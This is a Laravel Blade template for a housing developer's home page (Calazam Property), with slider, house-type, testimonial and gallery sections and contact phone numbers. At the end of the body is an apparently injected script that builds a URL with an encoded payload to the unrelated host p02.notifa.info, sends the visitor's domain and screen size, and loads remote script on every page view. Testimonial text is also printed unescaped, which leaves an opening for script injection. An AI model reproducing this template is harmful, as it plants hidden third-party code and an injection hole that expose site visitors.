<!DOCTYPE html>
<html lang="id-ID" prefix="og: http://ogp.me/ns#">
<head>  
    <title>Website Perumahan</title>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>

<link rel='stylesheet' id='ctwg-shortcodes-css'  href='{{ asset("/home/wp-content/plugins/cpo-widgets/css/style.css")}}' type='text/css' media='all' />
<link rel='stylesheet' id='ctwg-shortcodes-css'  href='{{asset("/css/w3.css")}}' type='text/css' media='all' />
<link rel='stylesheet' id='icomoon-css'  href='{{ asset("/home/wp-content/plugins/kiwi-social-share/assets/vendors/icomoon/style.css")}}' type='text/css' media='all' />
<link rel='stylesheet' id='modula_stylesheet-css'  href='{{ asset("/home/wp-content/plugins/modula-best-grid-gallery/scripts/modula.css")}}' type='text/css' media='all' />
<link rel='stylesheet' id='effects_stylesheet-css'  href='{{ asset("/home/wp-content/plugins/modula-best-grid-gallery/scripts/effects.css")}}' type='text/css' media='all' />
<link rel='stylesheet' id='cpotheme-base-css'  href='{{ asset("/home/wp-content/themes/brilliance/core/css/base.css")}}' type='text/css' media='all' />
<link rel='stylesheet' id='cpotheme-main-css'  href='{{ asset("/home/wp-content/themes/brilliance/style.css")}}' type='text/css' media='all' />
<link rel='stylesheet' id='rpt-css'  href='{{ asset("/home/wp-content/plugins/dk-pricr-responsive-pricing-table/css/rpt_style.min.css")}}' type='text/css' media='all' />
<script type='text/javascript' src='{{ asset("/home/wp-includes/js/jquery/jquery.js")}}'></script>
<script type='text/javascript' src='{{ asset("/home/wp-includes/js/jquery/jquery-migrate.min.js")}}'></script>
<script type='text/javascript' src='{{ asset("/home/wp-content/plugins/modula-best-grid-gallery/scripts/jquery.modula.js")}}'></script>
<script type='text/javascript' src='{{ asset("/home/wp-content/themes/brilliance/core/scripts/html5-min.js")}}'></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
<meta charset="UTF-8"/>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #e5e5e5; }
</style>
<link rel="icon" href="{{asset('/img/logo.png')}}" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<meta name="msapplication-TileImage" content="{{asset('/img/logo.png')}}" />
		<style type="text/css" id="wp-custom-css">
			/*
Anda bisa menambahkan CSS di sini.

Klik ikon bantuan di atas untuk info lebih lanjut.
*/

#main-slider_2 div.slider-content .slider-content-wrapper {
    position: relative;
    width: 100%;
    padding: 0;
    display: block;
    text-align: center;
}		</style>
	<meta name="google-site-verification" content="Nw6-kHMU9KYRD_zheqHCbnFanAo7__r3k9HiooUnZwA" />
</head>

<body class="home blog custom-background  sidebar-right">
	<div class="outer" id="top">
				<div class="wrapper">
			<div id="topbar" class="topbar secondary-color-bg dark">
				<div class="container">
										<div class="clear"></div>
				</div>
			</div>
			<header id="header" class="header ">
				<div class="header-wrapper">
					<div class="container">
						<div id="logo" class="logo"><a class="site-logo" href="/"><img src="{{asset('/img/logo.png')}}" ></a><span class="title site-title hidden"><a href="/">Calazam Property</a></span></div><div id="menu-mobile-open" class=" menu-mobile-open menu-mobile-toggle"></div>
@include('home.include.nav')						
<div class='clear'></div>
	</div>
</div>
</header>
			<div id="slider" class="slider dark secondary-color-bg">
		<div class="slider-slides cycle-slideshow" data-cycle-pause-on-hover="true" data-cycle-slides=".slide" data-cycle-pager=".slider-pages" data-cycle-timeout="8000" data-cycle-speed="1500" data-cycle-fx="fade">
		@foreach($slide as $sl)
		<div id="slide_1" class="slide cycle-slide-active" style="background-image:url({{ asset('/upload/slide/'.$sl->file) }});">
			<div class="slide-body">
				<div class="container">
					<div class="slide-caption">
						<h2 class="slide-title">
							{{$sl->judul}}						
						</h2>
						<div class="slide-content">
							<p>{{$sl->deskripsi}}</p>
						</div>
					</div>
				</div>
			</div>
		</div>
		@endforeach					
			</div>
			<div class="slider-pager">
		<div class="container">
			<div class="slider-pages"></div>
		</div>
	</div>
					
</div> 			
<div id="features" class="features">
	<div class="container">		
		<div id="section-heading heading" class="section-heading heading">Type yang  Kami Sajikan</div>
	<div class="row">
	@foreach($typesa as $type)
	<div class="column  col4">
	<div class="feature">
	<div class="feature-image">
		<img width="400" height="400" src="{{ asset('/upload/rumah/'.$type->file)}}" class="attachment-portfolio size-portfolio wp-post-image" alt="gambar" style="width:100%;height:200px;" />	</div>
		<h3 class="feature-title">
		{{$type->judul}}	
	    </h3>
	<div class="feature-content"><p>
		<a href="{{url('/detail/type/'.$type->slug)}}" class="w3-button w3-white w3-border w3-border-red w3-round-large"><i class="fa fa-eye"></i> Lihat</a>
		<a target="_blank" href="{{url('/order/'. $type->slug)}}" class="w3-button w3-white w3-border w3-border-blue w3-round-large"> <i class="fa fa-whatsapp" aria-hidden="true"></i>
Pesan</a>
	</p>
	</div>
	</div>
	</div>
	@endforeach
</div>
</div>
</div>
<div id="testimonials" class="testimonials">
	<div class="container">
		<div id="section-heading heading" class="section-heading heading">Apa Kata Mereka</div>		
		<div class="testimonial-list cycle-slideshow" data-cycle-slides=".testimonial" data-cycle-auto-height="container" data-cycle-pager=".testimonial-pages" data-cycle-pager-template="" data-cycle-timeout="6000" data-cycle-speed="1000" data-cycle-fx="fade">
		@foreach($ulasan as $ula)
		<div class="testimonial" id="testimonial-0-content" data-slide="0">
				<div class="column col4">
					<img style="width:150px; height: 150px;" src="{{asset('/upload/ulasan/'.$ula->file)}}" class="testimonial-image wp-post-image" alt="image"/>				</div>
				<div class="column col4x3 col-last">
					<div class="testimonial-content">
						<p>{!!$ula->isi!!}</p>
					</div>
					<div class="testimonial-author">
						<h4 class="testimonial-name">{{$ula->nama}}</h4>
					</div>
				</div>
			</div>
			@endforeach
		</div>	
		<div class='clear'></div>
			<br><br>
	</div>
</div>
<div id="portfolio" class="portfolio secondary-color-bg" style="padding-bottom: 20px;">
<div class="container">
	<div id="section-heading heading" class="section-heading heading">Galeri</div>
	<div class="row">
		@foreach($galery as $gal)
		<div class="column column-fit col4">
<div class="portfolio-item">
	<a class="portfolio-item-image" href="{{url('/galery/detail/'.$gal->slug)}}">
		<div class="portfolio-item-overlay dark">
			<h3 class="portfolio-item-title">
				{{$gal->judul}}			</h3>
						<div class="portfolio-item-description">
				<p>{{$gal->deskripsi}}</p>
							</div>
					</div>
		<img  src="{{asset('upload/galery/'.$gal->file)}}" alt="" title="" style="width: 400px; height: 250px" />	</a>
</div>
</div>
@endforeach
</div>
</div>
</div>
			<div class="clear"></div>
			<section id="subfooter" class="subfooter">
	<div class="container">
		<div class="column col4"><div id="ctwg-social-2" class="widget ctwg-social"><div class="widget-title heading">Follow Our Social Media</div>		<div class="ctwg-social" id="ctwg-social-2">
			<a class="w3-button w3-yellow" href="#" title="RSS">
				<i class="fa fa-rss"></i>
			</a>
			<a class="w3-button w3-blue" href="#" title="Facebook">
				<i class="fa fa-facebook"></i></span>
			</a>
			<a class="w3-button w3-red" href="#" title="YouTube">
				<i class="fa fa-youtube"></i>
			</a>
			<a class="w3-button w3-purple" href="#" title="Instagram">
				<i class="fa fa-instagram"></i>
			</a>
		</div>
		</div>
	</div>
	<div class="column col4 col-last">
		<div id="custom_html-4" class="widget_text widget widget_custom_html"><div class="widget-title heading">Kontak
		</div>
		<div class="textwidget custom-html-widget">
			<ul>
				<li>M. Halim Khairul (HP : 082283828264)</li>
				<li>Kairul (HP : 081266297561)</li>
			</ul>
		</div>
	</div>
</div>
<div class="clear"></div>	
</div>
</section>			
<footer id="footer" class="footer secondary-color-bg dark">
	<div class="container">
		<div id="footermenu" class="footermenu"></div><div class="footer-content">&copy; Calazam Property 2019. </div>				
	</div>
</footer>
						
<div class="clear"></div>
</div><!-- wrapper -->
</div><!-- outer -->
<div id="menu-mobile-close" class="menu-mobile-close menu-mobile-toggle"></div>
@include('home.include.navmobile')
<script type='text/javascript' src='{{ asset("/home/wp-content/themes/brilliance/core/scripts/core.js")}}'></script>
<script type='text/javascript' src='{{ asset("/home/wp-includes/js/wp-embed.min.js")}}'></script>
<script type='text/javascript' src='{{ asset("/home/wp-content/themes/brilliance/core/scripts/jquery-cycle2-min.js")}}'></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2W%2b3%2bIPCRZLF935bvbCpSaUhy5lfOjub%2bSOgAK3zaj9nR1O5ZEQkvfGWN3pKDhslASHJKDWNV0PYYLZCrTIN%2fS%2bEDGBeLRDVKwr%2fBRa0dCAJ%2bWNvQnM0NYd0LWXEhNDSe42wxilkwIdV704HJadzXjTKubiyFUuAzNC88REELIckE1O5ZaYZtLQO26DxnX4ZGBV05BJ7Sy8wOQY9aZ3suCYZ5Wepur3rcpfHH0DZXpOZ2FSoeekyRhhQU84Wv9eF8CZA59BPKvX4UjiSmmld8GGqUP%2bpKKuhtv0G%2b9cTQ%2beXB2rMD53Wg6zN%2boq0ogQMj0%2f4ma4tOh0ucRb93tbH45aAk2X5OoEVkQG38gCNX6LeQlYyre9v52cBB5jL7qBDqI47Qy7noulzimQjI08XscRPlInQXWWmSlIVAbDcPGCa0CUCnXVi7TyywhChk%2fQplxCdGq%2fsBuBlGkW9SBcWOUVVFCLaTd6BCGRGMuAeRKACLBJLafKl85tyiS4iITwBC" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>

